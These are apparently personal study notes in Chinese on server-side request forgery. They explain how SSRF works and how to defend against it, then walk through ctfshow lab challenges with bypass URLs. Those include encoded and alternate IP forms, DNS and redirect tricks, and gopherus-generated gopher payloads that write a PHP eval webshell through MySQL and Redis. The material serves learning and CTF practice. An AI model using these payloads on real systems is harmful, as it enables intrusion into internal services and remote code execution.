### SSRF服务端请求伪造

#### SSRF漏洞原理

​	SSRF(Server-Side Request Forgery:服务器端请求伪造) 

- 一种由攻击者构造形成由服务端发起请求的一个安全漏洞;
- 一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
- SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。

#### 黑盒探针

##### 业务功能点

- 1.社交分享功能：获取超链接的标题等内容进行显示
- 2.转码服务：通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览
- 3.在线翻译：给网址翻译对应网页的内容
- 4.图片加载/下载：例如富文本编辑器中的点击下载图片到本地；通过URL地址加载或下载图片
- 5.图片/文章收藏功能：主要其会取URL地址中title以及文本的内容作为显示以求一个好的用具体验
- 6.云服务厂商：它会远程执行一些命令来判断网站是否存活等，所以如果可以捕获相应的信息，就可以进行ssrf测试
- 7.网站采集，网站抓取的地方：一些网站会针对你输入的url进行一些信息采集工作
- 8.数据库内置功能：数据库的比如mongodb的copyDatabase函数
- 9.邮件系统：比如接收邮件服务器地址
- 10.编码处理, 属性信息处理，文件处理：比如ffpmg，ImageMagick，docx，pdf，xml处理器等
- 11.未公开的api实现以及其他扩展调用URL的功能：可以利用google 语法加上这些关键字去寻找SSRF漏洞

##### URL关键参数

- share
- wap
- url
- link
- src
- source
- target
- u
- display
- sourceURl
- imageURL
- domain

#### 白盒分析

（文件读取，加载，数据操作类的函数）



#### SSRF伪协议利用

```
http://  Web常见访问，如http://127.0.0.1
file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
sftp:// SSH文件传输协议或安全文件传输协议
ldap:// 轻量级目录访问协议
tftp:// 简单文件传输协议
```

#### SSRF漏洞防御

```
1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。
2,统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。
4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。
5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。
```



#### 案例

正常加载图片是数据格式

![image-20240508210037016](D:\Infiltration\笔记\note\图片\image-20240508210037016.png)

读取本地1001端口,成功访问搭建的zblog

```
http://127.0.0.1:1001
```



![image-20240508211317366](D:\Infiltration\笔记\note\图片\image-20240508211317366.png)





#### ctfshow-351

![image-20240508220214979](D:\Infiltration\笔记\note\图片\image-20240508220214979.png)

使用hackbar，post请求http协议

```
url=http://127.0.0.1/flag.php
```

![image-20240508220312564](D:\Infiltration\笔记\note\图片\image-20240508220312564.png)



#### ctfshow-352

必须为http或https但是过滤localhost和127.0.0

![image-20240508220843200](D:\Infiltration\笔记\note\图片\image-20240508220843200.png)

##### URL编码绕过

直接用hackbar自带的编码

```
url=http://%31%32%37%2e%30%2e%30%2e%31/flag.php
```

![image-20240508221224892](D:\Infiltration\笔记\note\图片\image-20240508221224892.png)

##### 进制绕过

可以看到127进行16进制转换后为7f，在16进制前加上0x使电脑识别为16进制，ping 0x7f.0.0.1 计算机可识别为127.0.0.1

![image-20240508222054952](D:\Infiltration\笔记\note\图片\image-20240508222054952.png)



```
url=http://0x7f.0.0.1/flag.php
```

![image-20240508222252310](D:\Infiltration\笔记\note\图片\image-20240508222252310.png)



八进制前面加上0，使电脑识别为八进制

```
url=http://0177.0.0.1/flag.php
```

![image-20240508222600775](D:\Infiltration\笔记\note\图片\image-20240508222600775.png)



##### ip地址转换



![image-20240508223314279](D:\Infiltration\笔记\note\图片\image-20240508223314279.png)

###### 十进制整数

```
url=http://2130706433/flag.php
```



![image-20240508223349210](D:\Infiltration\笔记\note\图片\image-20240508223349210.png)

###### 十六进制整数

```
url=http://0x7F000001/flag.php
```

![image-20240508223517920](D:\Infiltration\笔记\note\图片\image-20240508223517920.png)

```
还有一种特殊的省略模式
  127.0.0.1写成127.1

用CIDR绕过localhost
  url=http://127.127.127.127/flag.php

还有很多方式
  url=http://0/flag.php
  url=http://0.0.0.0/flag.php
```

#### ctfshow-353

像352关进制绕过

```
url=http://0x7F000001/flag.php
```

![image-20240508224333905](D:\Infiltration\笔记\note\图片\image-20240508224333905.png)



#### ctfshow-354



过滤localhost，0，1等

![image-20240508224726151](D:\Infiltration\笔记\note\图片\image-20240508224726151.png)

###### 

###### 绑定域名

将127.0.0.1解析到域名绕过

###### sudo.cc

sudo.cc解析为127.0.0.1

```
url=http://sudo.cc/flag.php
```



![image-20240508231344649](D:\Infiltration\笔记\note\图片\image-20240508231344649.png)





##### ctfshow-355

限制域名长度

![image-20240511133915902](D:\Infiltration\笔记\note\图片\image-20240511133915902.png)

###### 0=127.0.0.1

```
url=http://0/flag.php
```



![image-20240511134015796](D:\Infiltration\笔记\note\图片\image-20240511134015796.png)





##### ctfshow-356

限制长度

![image-20240511134347839](D:\Infiltration\笔记\note\图片\image-20240511134347839.png)

###### 0=127.0.0.1

```
url=http://0/flag.php
```

![image-20240511134421246](D:\Infiltration\笔记\note\图片\image-20240511134421246.png)

##### ctfshow-357

过滤解析后的ip等

![image-20240511135157338](D:\Infiltration\笔记\note\图片\image-20240511135157338.png)

###### 重定向解析绕过

```
<?php
header("Location:http://127.0.0.1/flag.php"); 
```

###### ubuntu临时开启php服务器

```
apt install php
php -S 0.0.0.0:5566
killall php
```

![image-20240511141808036](D:\Infiltration\笔记\note\图片\image-20240511141808036.png)

```
url=http://89.116.173.117:5566/http/poc.php
```

![image-20240511141620870](D:\Infiltration\笔记\note\图片\image-20240511141620870.png)

##### ctfshow-358

url需要以http://ctf开头,以show结尾，才能触发file_get_contents()

![image-20240511142048778](D:\Infiltration\笔记\note\图片\image-20240511142048778.png)

###### http基本身份认证方式绕过@

此处`ctf.`将作为账号登录127.0.0.1，并且向flag.php传一个`show`参数来绕过

```
url=http://ctf.@127.0.0.1/flag.php#show
```

![image-20240511143130792](D:\Infiltration\笔记\note\图片\image-20240511143130792.png)



##### ctfshow-359

提示打无密码的mysql

![image-20240511144514801](D:\Infiltration\笔记\note\图片\image-20240511144514801.png)



![image-20240511151012487](D:\Infiltration\笔记\note\图片\image-20240511151012487.png)

抓包找到跨站注入点，因为要攻击mysql，需要用到gopher协议

![image-20240511150939659](D:\Infiltration\笔记\note\图片\image-20240511150939659.png)

###### gopher协议

gopher:// 分布式文档传递服务，可使用gopherus生成payload
由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）
应用：漏洞利用 或 信息收集 通讯相关服务的时候 工具：[Gopherus](https://github.com/tarunkant/Gopherus)

选择mysql，执行sql语句，写入一个后门语句到网站默认目录`/var/www/html/`

```
python2 gopherus.py --exploit mysql
Give MySQL username: root
Give query to execute: select "<?php eval($_POST["pass"]);?>" into outfile "/var/www/html/pass.php"
```

![image-20240511152450227](D:\Infiltration\笔记\note\图片\image-20240511152450227.png)

```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%4b%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%70%61%73%73%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%70%61%73%73%2e%70%68%70%22%01%00%00%00%01
```

使用burp将url编码一下，因为浏览器会进行url解码一次。

![image-20240511152544602](D:\Infiltration\笔记\note\图片\image-20240511152544602.png)



访问生成的pass.php，查看根目录下的flag

![image-20240511152932862](D:\Infiltration\笔记\note\图片\image-20240511152932862.png)

##### ctfshow-360

redis数据库未授权

![image-20240511153918403](D:\Infiltration\笔记\note\图片\image-20240511153918403.png)

使用gopherus生成

```
python2 gopherus.py --exploit redis
What do you want?? (ReverseShell/PHPShell): phpshell
Give web root location of server (default is /var/www/html):
Give PHP Payload (We have default PHP Shell): <?php eval($_POST[pass]);?>
```

![image-20240511153950326](D:\Infiltration\笔记\note\图片\image-20240511153950326.png)



直接利用生成的payload请求

![image-20240511154542973](D:\Infiltration\笔记\note\图片\image-20240511154542973.png)

使用哥斯拉连接生成的shell.php

![image-20240511154902361](D:\Infiltration\笔记\note\图片\image-20240511154902361.png)















































































































```
1、SSRF漏洞原理
SSRF(Server-Side Request Forgery:服务器端请求伪造) 
一种由攻击者构造形成由服务端发起请求的一个安全漏洞;
一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。
（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）
SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。

2、SSRF漏洞挖掘




白盒分析：见代码审计（文件读取，加载，数据操作类的函数）

3、

gopher:// 分布式文档传递服务，可使用gopherus生成payload
由于有部分协议http这类不支持，可以gopher来进行通讯（mysql，redis等）
应用：漏洞利用 或 信息收集 通讯相关服务的时候 工具：Gopherus

4、SSRF绕过方式
-限制为http://www.xxx.com 域名
采用http基本身份认证的方式绕过，即@
http://www.xxx.com@www.xxyy.com

-限制请求IP不为内网地址
当不允许ip为内网地址时：
（1）采取短网址绕过
（2）采取域名解析
（3）采取进制转换
（4）采取3XX重定向

5、SSRF漏洞防御
1,过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。
2,统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
3,限制请求的端口为http常用的端口，比如，80,443,8080,8090。
4,黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。
5,禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。


#CTFSHOW SSRF 白盒
CTF 绕过
1、无过滤直接获取
url=http://127.0.0.1/flag.php

2-3、IP地址进制绕过
十六进制
  url=http://0x7F.0.0.1/flag.php

八进制
  url=http://0177.0.0.1/flag.php

10 进制整数格式
  url=http://2130706433/flag.php

16 进制整数格式，还是上面那个网站转换记得前缀0x
  url=http://0x7F000001/flag.php

还有一种特殊的省略模式
  127.0.0.1写成127.1

用CIDR绕过localhost
  url=http://127.127.127.127/flag.php

还有很多方式
  url=http://0/flag.php
  url=http://0.0.0.0/flag.php


4、域名解析IP绕过
test.xiaodi8.com -> 127.0.0.1
url=http://test.xiaodi8.com/flag.php

5、长度限制IP绕过
url=http://127.1/flag.php

6、长度限制IP绕过
url=http://0/flag.php

7、利用重定向解析绕过
<?php
header("Location:http://127.0.0.1/flag.php"); 
url=http://47.94.236.117/xx.php

8、匹配且不影响写法解析
url=http://ctf.@127.0.0.1/flag.php?show

9-10、利用gopher协议打服务
https://github.com/tarunkant/Gopherus
d:Python2.7\python.exe gopherus.py --exploit mysql
d:Python2.7\python.exe gopherus.py --exploit redis

```

